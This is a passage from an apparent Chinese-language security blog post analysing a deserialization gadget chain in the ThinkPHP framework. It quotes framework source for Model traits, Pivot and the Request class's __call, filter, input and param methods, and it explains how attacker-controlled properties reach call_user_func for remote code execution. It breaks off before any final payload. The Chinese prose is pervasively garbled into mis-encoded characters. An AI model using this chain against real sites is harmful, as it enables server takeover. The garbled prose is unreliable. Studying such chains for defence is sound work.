class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span>-&gt;visible([<span class="variable">$attr</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹çœ‹åˆ°è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªifè¯­å¥ä¸­ï¼Œæ‰§è¡Œæ–¹æ³•<code>$relation-&gt;visible($name);</code></p><p>å¦‚æœæ˜¯å¯æ§å˜é‡-&gt;æ–¹æ³•(å¯æ§å‚æ•°)ï¼Œå°±å¯ä»¥å»æ‰¾__call</p><p>çœ‹ä¸‹æ˜¯å¦æ˜¯å¯æ§çš„ï¼Œ$this-&gt;appendå¯æ§ï¼Œå†çœ‹getRelation()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$name</code>å¯æ§ï¼Œæ˜“ä½¿å¾—getRelation()è¿”å›ä¸ºç©ºï¼Œè¿›è€Œif (!$relation)æˆç«‹ï¼Œè¿›å…¥getAttr()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›getData()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getData()è¿”å›çš„<code>$this-&gt;data</code>å¯æ§ï¼Œæ‰€ä»¥ç›¸å½“äº <code>$relation = $this-&gt;data($key);</code>ï¼Œæ•…$relationå¯æ§</p><p><code>$name</code>ä¸º<code>$this-&gt;append</code>çš„é”®å€¼ï¼Œ<code>$append</code>å¯æ§ï¼Œæ•…<code>$name</code>ä¹Ÿå¯æ§</p><p>ä½†éœ€è¦æ³¨æ„ï¼Œ<code>__toString()</code>æ˜¯<code>Conversion</code>ç±»çš„ï¼Œ<code>getAttr()</code>ç­‰æ˜¯<code>Attribute</code>ç±»çš„ï¼Œè¿™ä¸¤ä¸ªéƒ½æ˜¯traitç±»ã€‚</p><blockquote><p>è‡ª PHP 5.4.0 èµ·ï¼ŒPHP å®ç°äº†ä¸€ç§ä»£ç å¤ç”¨çš„æ–¹æ³•ï¼Œç§°ä¸º traitã€‚é€šè¿‡åœ¨ç±»ä¸­ä½¿ç”¨use å…³é”®å­—ï¼Œå£°æ˜è¦ç»„åˆçš„Traitåç§°ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œç±»çš„ç»§æ‰¿è¦ä½¿ç”¨useå…³é”®å­—ã€‚ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­ç±»åŒæ—¶ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»ã€‚</p></blockquote><p>ç»è¿‡å¯»æ‰¾ï¼Œæ‰¾åˆ°äº†Modelç±»ç¬¦åˆè¦æ±‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210905174435123.png" alt="image-20210905174435123"></p><p>ä½†å®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼ŒæŠ½è±¡ç±»ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–</p><blockquote><p>æŠ½è±¡ç±»ä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–ã€‚æŠ½è±¡ç±»ä¸­åªå®šä¹‰ï¼ˆæˆ–éƒ¨åˆ†å®ç°ï¼‰å­ç±»éœ€è¦çš„æ–¹æ³•ã€‚å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æŠ½è±¡ç±»å¹¶é€šè¿‡å®ç°æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œä½¿æŠ½è±¡ç±»å…·ä½“åŒ–ã€‚<br>å¦‚æœå­ç±»éœ€è¦å®ä¾‹åŒ–ï¼Œå‰ææ˜¯å®ƒå®ç°äº†æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ã€‚å¦‚æœå­ç±»æ²¡æœ‰å…¨éƒ¨å®ç°æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥å­ç±»ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå¿…é¡»åœ¨ class å‰é¢åŠ ä¸Š abstract å…³é”®å­—ï¼Œå¹¶ä¸”ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚</p></blockquote><p>æ„é€ çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–Modelç±»çš„ä¸€ä¸ªéæŠ½è±¡å­ç±»ï¼Œæ‰¾åˆ°äº†Pivotç±»</p><p>ç°åœ¨ç¼ºä¸€ä¸ªè¿›è¡Œä»£ç æ‰§è¡Œçš„ç‚¹ï¼Œæƒ³åŠæ³•æ‰¾æ‰¾æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„<code>__call()</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸å­˜åœ¨çš„æ–¹æ³•æ¥è°ƒç”¨å®ƒï¼Œä¸€ç•ªæœå¯»æ‰¾åˆ°Requestç±»çš„__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>$hook</code>å¯æ§ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªhookæ•°ç»„<code>&quot;visable&quot;=&gt;&quot;method&quot;</code>ï¼Œä½†ä¸èƒ½ç›´æ¥åˆ©ç”¨call_user_func_array()æ‰§è¡Œå‘½ä»¤ï¼Œarray_unshift()æŠŠ<code>$this</code>æ’åˆ°äº†<code>$args</code>çš„å‰é¢ï¼Œä½¿å¾—å‚æ•°ä¸å¯æ§</p><blockquote><p>åœ¨Thinkphpçš„Requestç±»ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½<code>filter</code>åŠŸèƒ½ï¼Œäº‹å®ä¸ŠThinkphpå¤šä¸ªRCEéƒ½ä¸è¿™ä¸ªåŠŸèƒ½æœ‰å…³ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•è¦†ç›–<code>filter</code>çš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚</p></blockquote><p>åœ¨Request.phpçš„1459è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$default</span> = array_pop(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤</span></span><br><span class="line">            <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>æƒ³åŠæ³•è®©call_user_func()çš„ä¸¤ä¸ªå‚æ•°å¯æ§</p><p>åœ¨Requestç±»çš„inputæ–¹æ³•ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// è§£æname</span></span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>array_walk_recursive()</code>æ¥è°ƒç”¨<code>filterValue</code>æ–¹æ³•ï¼Œæ³¨æ„<code>$filter</code>æ˜¯é€šè¿‡<code>getFilter</code>å¾—åˆ°çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥<code>$filter = $this-&gt;getFilter($filter, $default);</code>ç›¸å½“äºæ˜¯<code>$filter=$this-&gt;filter</code>,è€Œ<code>$this-&gt;filter</code>å¯æ§ï¼Œæ•…<code>$filter</code>å¯æ§ã€‚</p><p>ä½†è¿™é‡Œçš„dataæ•°ç»„ä¸å¯æ§ï¼Œå¦‚æœå¯æ§ï¼Œä¸”<code>$name</code>æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œ$dataå°±ç›´æ¥ä½œä¸ºå›è°ƒå‡½æ•°çš„å¯æ§å‚æ•°</p><p>æ¥ä¸‹æ¥çœ‹çœ‹æœ‰æ²¡æœ‰å“ªäº›åœ°æ–¹è°ƒç”¨äº†inputå‡½æ•°ï¼Œå®ƒçš„$dataè¿™ä¸ªä½ç½®çš„å‚æ•°æ˜¯å¦å¯æ§</p><p>åŒæ ·ä¹Ÿæ˜¯åœ¨Requestç±»ä¸­ï¼Œæœ‰ä¸€ä¸ªparamå‡½æ•°æ»¡è¶³è¦æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;post(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;put(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$vars</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        <span class="variable">$data</span> = is_array(<span class="variable">$file</span>) ? array_merge(<span class="keyword">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè¿™é‡Œä½¿ç”¨äº†inputå‡½æ•°ï¼Œæ³¨æ„<code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code>ä¹Ÿå°±æ˜¯æ³¨é‡Šä¸­è¯´çš„<code>$this-&gt;param</code>ä¼šå’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</p><p>å› ä¸ºè°ƒç”¨çš„æ˜¯<code>array_walk_recursive()</code>ï¼Œæ•°ç»„ä¸­æ¯ä¸ªæˆå‘˜éƒ½å¯ä»¥è¢«è°ƒç”¨åˆ°ï¼Œæ•…æ— å½±å“ã€‚</p><p>å‚æ•°<code>$this-&gt;param</code>å¯æ§ï¼Œç›¸å½“äº<code>$data</code>å¯æ§ï¼Œä½†è€ƒè™‘åŠ¨æ€æ‰§è¡Œå‘½ä»¤ï¼Œå°±ä¸ç›´æ¥æ„é€ <code>$this-&gt;param</code>,å¯ä»¥æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤å†™åœ¨getå‚æ•°é‡Œã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°<code>$name</code>è¿˜ä¸å¯æ§ï¼Œå¯»æ‰¾æœ‰æ— è°ƒç”¨paramå‡½æ•°çš„åœ°æ–¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$value</span>  = <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == strtolower(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span 